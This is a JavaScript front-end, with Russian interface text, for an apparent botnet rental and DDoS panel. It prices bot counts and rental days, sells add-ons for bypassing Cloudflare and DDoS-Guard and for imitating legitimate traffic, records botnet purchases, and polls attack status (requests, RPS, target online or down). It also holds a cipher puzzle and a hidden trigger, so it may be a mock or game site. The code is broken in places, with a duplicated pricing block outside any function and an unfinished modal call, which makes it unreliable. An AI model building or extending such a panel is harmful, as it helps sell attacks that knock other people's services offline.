// API

function apiFetch(endpoint, options = {}) {
    const token = localStorage.getItem(TOKEN_KEY);
    const headers = {
        'Content-Type': 'application/json',
        ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
        ...(options.headers || {})
    };
    return fetch(`${API_BASE}${endpoint}`, { ...options, headers })
        .then(r => { if (!r.ok) throw new Error(`HTTP ${r.status}`); return r.json(); })
        .catch(err => { console.error('API Error:', err); throw err; });
}

function formatCurrency(amount) { return `$${Number(amount).toFixed(2)}`; }
function formatDate(iso) { if (!iso) return '—'; try { return new Date(iso).toLocaleString(); } catch { return iso; } }
function pluralize(n, one, few, many) { n = Math.abs(n); if (n % 10 === 1 && n % 100 !== 11) return one; if (n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20)) return few; return many; }

window.updatePriceDisplay = function() {
    const slider = document.getElementById('botSlider');
    const durationSelect = document.getElementById('durationSelect');
    const botCountLabel = document.getElementById('botCountLabel');
    const totalPriceSpan = document.getElementById('totalPrice');
    const buyPriceSpan = document.getElementById('buyPrice');
    if (!slider || !durationSelect) return;
    const count = parseInt(slider.value);
    const days = parseInt(durationSelect.value);
    const options = {};
    document.querySelectorAll('.opt-check:checked').forEach(el => { const key = el.dataset.key; if (key) options[key] = true; });
    let price = count * 0.01 * days;
    let mult = 1;
    const optionMultipliers = { 'BYPASS_CLOUDFLARE': 1.20, 'BYPASS_DDOS_GUARD': 1.30, 'ROTATE_PROXY': 1.15, 'IMITATE_LEGIT_TRAFFIC': 1.10 };
    for (const [key, value] of Object.entries(options)) { if (value && optionMultipliers[key]) mult *= optionMultipliers[key]; }
    price = Math.round(price * mult * 100) / 100;
    if (botCountLabel) botCountLabel.textContent = count;
    if (totalPriceSpan) totalPriceSpan.textContent = price.toFixed(2);
    if (buyPriceSpan) buyPriceSpan.textContent = price.toFixed(2);
};

function validateBotCount(count) { const minBots = 500; const maxBots = 500000; if (count < minBots) return { valid: false, message: `❌ Минимальное количество — ${minBots} ботов.` }; if (count > maxBots) return { valid: false, message: `❌ Максимальное количество — ${maxBots} ботов.` }; return { valid: true }; }

function explosionEffect() {
    const colors = ['#8b5cf6', '#06d6a0', '#ef4444', '#fbbf24', '#ffffff'];
    for (let i = 0; i < 40; i++) {
        const particle = document.createElement('div');
        particle.style.cssText = `position:fixed;width:${Math.random()*8+4}px;height:${Math.random()*8+4}px;background:${colors[Math.floor(Math.random()*colors.length)]};border-radius:50%;pointer-events:none;z-index:9999;left:${window.innerWidth/2}px;top:${window.innerHeight/2}px;box-shadow:0 0 20px ${colors[Math.floor(Math.random()*colors.length)]};`;
        document.body.appendChild(particle);
        const angle = Math.random() * 2 * Math.PI;
        const velocity = Math.random() * 250 + 80;
        const dx = Math.cos(angle) * velocity;
        const dy = Math.sin(angle) * velocity;
        let x = window.innerWidth / 2, y = window.innerHeight / 2, opacity = 1;
        const animate = () => { x += dx * 0.02; y += dy * 0.02; opacity -= 0.01; particle.style.transform = `translate(${x - window.innerWidth/2}px, ${y - window.innerHeight/2}px) scale(${opacity})`; particle.style.opacity = opacity; if (opacity > 0) requestAnimationFrame(animate); else particle.remove(); };
        animate();
    }
}

    let price = count * 0.01 * days;
    let mult = 1;
    const optionMultipliers = { 'BYPASS_CLOUDFLARE': 1.20, 'BYPASS_DDOS_GUARD': 1.30, 'ROTATE_PROXY': 1.15, 'IMITATE_LEGIT_TRAFFIC': 1.10 };
    for (const [key, value] of Object.entries(options)) { if (value && optionMultipliers[key]) mult *= optionMultipliers[key]; }
    price = Math.round(price * mult * 100) / 100;
    const currentBalance = currentUser ? currentUser.balance : 0;
    if (currentBalance < price) {
        showModal('❌', `<p>Недостаточно средств.</p><p>💳 ${formatCurrency(currentBalance)}</p><p>💰 ${formatCurrency(price)}</p>`, [{ label: '💎', cls: 'btn-gold', action: function() { closeModal(); window.showDepositModal(); } }]);
        return;
    }
    try {
        const res = await apiFetch('/buy', { method: 'POST', body: JSON.stringify({ bot_count: count, duration_days: days, options }) });
        if (res.success === true || res.botnet_id) {
            currentUser.balance = res.new_balance;
            localStorage.setItem(USER_KEY, JSON.stringify(currentUser));
            explosionEffect();
            showModal('✅', `<p>🎉 Ботнет куплен!</p><p>🤖 ${res.bot_count}</p><p>📅 ${res.duration_days}д</p><p>💰 ${formatCurrency(res.price)}</p>`,

            showNotification('✅', 'success');

                return;

        }
    } catch(e) { showModal('❌', 'Сервер недоступен.'); }
};

function startAttackMonitoring(attackId) {
    if (attackInterval) clearInterval(attackInterval);
    addLogLine(`📡 ${attackId}`);
    let startTime = Date.now();
    attackInterval = setInterval(async () => {
        try {
            const res = await apiFetch(`/attack/${attackId}/status`);
            if (res.error) { addLogLine(`❌ ${res.error}`); return; }
            const stats = res.stats || {};
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            $('statRequests').textContent = stats.total_requests || 0;
            $('statErrors').textContent = stats.failed_requests || 0;
            $('statRps').textContent = stats.rps || 0;
            $('statBytes').textContent = stats.bytes_sent ? Math.round(stats.bytes_sent / 1024) : 0;
            const status = stats.target_status || 'online';
            $('statStatus').textContent = status === 'online' ? '🟢' : '🔴';
            $('targetStatus').textContent = status === 'online' ? '🟢' : '🔴';
            $('targetStatus').className = `target-status ${status}`;
            $('attackTimer').textContent = `⏱ ${elapsed}с / ${res.duration_seconds || 0}с`;
            const progress = res.duration_seconds ? Math.min(100, (elapsed / res.duration_seconds) * 100) : 0;
            $('attackProgress').style.width = progress + '%';
            if (res.status !== 'running') { addLogLine(`🏁 ${res.status}`); clearInterval(attackInterval); attackInterval = null; $('startAttackBtn').disabled = false; $('stopAttackBtn').disabled = true; activeAttackId = null; showNotification('🏁', 'success'); }
        } catch(e) {}
    }, 1000);
}

// ===== УРОВЕНЬ 2: Виженер + Base64 =====
function vigenereDecrypt(text, key) {
    let result = '';
    let keyIndex = 0;
    const upperKey = key.toUpperCase();
    for (let i = 0; i < text.length; i++) {
        const ch = text[i];
        const code = ch.charCodeAt(0);
        if (code >= 65 && code <= 90) {
            const shift = upperKey.charCodeAt(keyIndex % upperKey.length) - 65;
            result += String.fromCharCode((code - 65 - shift + 26) % 26 + 65);
            keyIndex++;
        } else if (code >= 97 && code <= 122) {
            const shift = upperKey.charCodeAt(keyIndex % upperKey.length) - 65;
            result += String.fromCharCode((code - 97 - shift + 26) % 26 + 97);
            keyIndex++;
        } else {
            result += ch;
        }
    }
    return result;
}

// ============================================================
// PHANTOM TRIGGER (скрытый триггер в футере)
// ============================================================
function initPhantomTrigger() {
    const trigger = document.getElementById('phantomTrigger');
    if (trigger) {
        trigger.addEventListener('click', function(e) {
            e.stopPropagation();
            if (!phantomTriggered) {
                phantomTriggered = true;
                showNotification('◈', 'info');
                navigateTo('puzzle');
            }
        });
        let clickCount = 0;
        trigger.addEventListener('dblclick', function(e) {
            clickCount++;
            if (clickCount >= 3) {
                showNotification('⚡', 'warning');
                clickCount = 0;
            }
        });
    }
}

// ============================================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================================
function init() {
    const saved = localStorage.getItem(USER_KEY);
    if (saved) {
        try {
            currentUser = JSON.parse(saved);
            const token = localStorage.getItem(TOKEN_KEY);
            if (!token) { currentUser = null; localStorage.removeItem(USER_KEY); }
        } catch(e) { currentUser = null; }
    }
    
    if (localStorage.getItem('phantom_solved') === 'true') {
        Object.keys(levelProgress).forEach(k => levelProgress[k] = true);
    }

    renderNav();
    navigateTo(currentUser ? 'dashboard' : 'home');
    initFakeNotifications();
    initPhantomTrigger();

    setInterval(async () => {
        if (currentUser) {
            try {
                const profile = await apiFetch('/profile');
                if (!profile.error) {
                    currentUser.balance = profile.balance;
                    localStorage.setItem(USER_KEY, JSON.stringify(currentUser));
                    userBalance.textContent = formatCurrency(currentUser.balance);
                }
            } catch(e) {}
        }
    }, 30000);
    
    setInterval(() => {
        if (Object.values(levelProgress).every(v => v === true)) {
            localStorage.setItem('phantom_solved', 'true');
        }
    }, 5000);
}

document.addEventListener('DOMContentLoaded', init);
</script>
